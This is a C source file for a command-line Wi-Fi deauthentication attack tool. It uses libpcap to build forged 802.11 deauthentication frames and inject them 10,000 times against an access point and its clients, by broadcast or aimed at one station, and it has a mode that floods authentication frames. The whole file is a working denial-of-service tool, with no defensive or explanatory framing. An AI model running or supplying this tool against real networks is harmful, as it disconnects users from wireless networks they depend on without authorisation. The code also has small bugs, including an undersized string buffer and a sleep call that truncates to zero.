#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>

void usage() {
	printf("syntax: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
	printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}


typedef struct {
	char* dev_;
} Param;

Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 3) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}


struct ieee80211_radiotap_header {
	u_int8_t        it_version;
	u_int8_t        it_pad;
	u_int16_t       it_len;
	u_int32_t       it_present;
};


struct Deauth{
    u_int16_t	subtype;
	u_int16_t	duration;
	u_int8_t	destination[6];
	u_int8_t	source[6];
	u_int8_t	bss_id[6];
	u_int16_t	fs_number;
} __attribute__((__packed__));


struct Wireless_management{
	u_int16_t	reason_code;
} __attribute__((__packed__));

struct Wireless_management_auth{
    u_int16_t algorithm;
    u_int16_t seq;
    u_int16_t status_code;
};






void make_deauth_packet(struct ieee80211_radiotap_header* radiotap_header, struct Deauth* deauth, struct Wireless_management *wireless_management, char* source, char* destination){
	
	radiotap_header -> it_version = 0;
	radiotap_header -> it_pad = 0;
	radiotap_header -> it_len = 0x8;
	radiotap_header -> it_present = 0;   

	deauth -> subtype = 0x00c0;
	deauth -> duration = 0;	


	char destination_copy[strlen(destination)];
	strcpy(destination_copy, destination);

	char* destiantion_mac = strtok(destination_copy, ":");     
	
	for(int i=0; destiantion_mac != NULL ;i++){
		deauth -> destination[i] = (u_int8_t)strtol(destiantion_mac, NULL, 16);
		destiantion_mac = strtok(NULL, ":");
	}
	
	char* source_mac = strtok(source, ":");

	for(int i=0; source_mac != NULL ;i++){
		deauth -> source[i] = (u_int8_t)strtol(source_mac, NULL, 16);
		
		deauth -> bss_id[i] = (u_int8_t)strtol(source_mac, NULL, 16);

		source_mac = strtok(NULL, ":");
	}


	deauth -> fs_number = 0;	
	wireless_management -> reason_code = 0x0004;
}




void make_auth_packet(struct ieee80211_radiotap_header* radiotap_header, struct Deauth* auth, struct Wireless_management_auth *wireless_management_auth, char* source, char* destination){
	
	radiotap_header -> it_version = 0;
	radiotap_header -> it_pad = 0;
	radiotap_header -> it_len = 0x8;
	radiotap_header -> it_present = 0;   

	auth -> subtype = 0x00b0;
	auth -> duration = 0;	

	char destination_copy[strlen(destination)];
	strcpy(destination_copy, destination);

	char* destiantion_mac = strtok(destination_copy, ":");
	
	for(int i=0; destiantion_mac != NULL ;i++){
		auth -> destination[i] = (u_int8_t)strtol(destiantion_mac, NULL, 16);
		destiantion_mac = strtok(NULL, ":");
	}
	
	char* source_mac = strtok(source, ":");

	for(int i=0; source_mac != NULL ;i++){
		auth -> source[i] = (u_int8_t)strtol(source_mac, NULL, 16);
		auth -> bss_id[i] = (u_int8_t)strtol(source_mac, NULL, 16);

		source_mac = strtok(NULL, ":");
	}

	auth -> fs_number = 0;
	
	wireless_management_auth -> algorithm = 0x0000;
	wireless_management_auth -> seq = 0x0001;
	wireless_management_auth -> status_code = 0x0000;
}



int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);

	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
	
	struct ieee80211_radiotap_header* radiotap_header = malloc(sizeof(struct ieee80211_radiotap_header));
	struct Deauth* deauth = malloc(sizeof(struct Deauth));
	

	
	if(argc==3){
		struct Wireless_management* wireless_management = malloc(sizeof(struct Wireless_management));

		u_char* broadcast = (u_char*)malloc(sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth) + sizeof(struct Wireless_management));
		
		make_deauth_packet(radiotap_header, deauth, wireless_management , argv[2], "ff:ff:ff:ff:ff:ff");
		
		memcpy(broadcast, radiotap_header, sizeof(struct ieee80211_radiotap_header));
		memcpy(broadcast + sizeof(struct ieee80211_radiotap_header), deauth, sizeof(struct Deauth));
		memcpy(broadcast + sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth), wireless_management, sizeof(struct Wireless_management));
		
		for(int i =0; i<sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth) + sizeof(struct Wireless_management); i++)
			printf("%02x ", broadcast[i]);

		for(int i =0 ; i<10000; i++){
			int result = pcap_sendpacket(pcap, broadcast, sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth) + sizeof(struct Wireless_management));
			if (result != 0)
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", result, pcap_geterr(pcap));
			sleep(0.5);
		}
	}
	


	if(argc==4){
		struct Wireless_management* wireless_management = malloc(sizeof(struct Wireless_management));

		u_char* unicast_ap = (u_char*)malloc(sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth) + sizeof(struct Wireless_management));
		u_char* unicast_sta = (u_char*)malloc(sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth) + sizeof(struct Wireless_management));
		
		make_deauth_packet(radiotap_header, deauth, wireless_management , argv[2], argv[3]);

		memcpy(unicast_ap, radiotap_header, sizeof(struct ieee80211_radiotap_header));
		memcpy(unicast_ap + sizeof(struct ieee80211_radiotap_header), deauth, sizeof(struct Deauth));
		memcpy(unicast_ap + sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth), wireless_management, sizeof(struct Wireless_management));


		u_int8_t tmp[6];
		memcpy(tmp, deauth->destination, 6);

		memcpy(deauth->destination, deauth->source, 6);
		memcpy(deauth->source, tmp, 6);
		memcpy(deauth->bss_id, tmp, 6);

		memcpy(unicast_sta, radiotap_header, sizeof(struct ieee80211_radiotap_header));
		memcpy(unicast_sta + sizeof(struct ieee80211_radiotap_header), deauth, sizeof(struct Deauth));
		memcpy(unicast_sta + sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth), wireless_management, sizeof(struct Wireless_management));


		
		for(int i =0 ; i<10000; i++){
			int result = pcap_sendpacket(pcap, unicast_ap, sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth) + sizeof(struct Wireless_management));
			if (result != 0)
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", result, pcap_geterr(pcap));

			int res = pcap_sendpacket(pcap, unicast_sta, sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth) + sizeof(struct Wireless_management));
			if (res != 0)
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
			sleep(0.5);
		}
	}
	


	if(argc==5 && !strncmp("-auth", argv[4],5)){
        struct Wireless_management_auth* wireless_management_auth = malloc(sizeof(struct Wireless_management_auth));
	
		u_char* auth = (u_char*)malloc(sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth) + sizeof(struct Wireless_management_auth));
		
		make_auth_packet(radiotap_header, deauth, wireless_management_auth , argv[3], argv[2]);

		memcpy(auth, radiotap_header, sizeof(struct ieee80211_radiotap_header));
		memcpy(auth + sizeof(struct ieee80211_radiotap_header), deauth, sizeof(struct Deauth));
		memcpy(auth + sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth), wireless_management_auth, sizeof(struct Wireless_management_auth));

		for(int i =0 ; i<10000; i++){
			int result = pcap_sendpacket(pcap, auth, sizeof(struct ieee80211_radiotap_header) + sizeof(struct Deauth) + sizeof(struct Wireless_management_auth));
			if (result != 0)
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", result, pcap_geterr(pcap));
			sleep(0.5);
		}

	}
	return 0;
}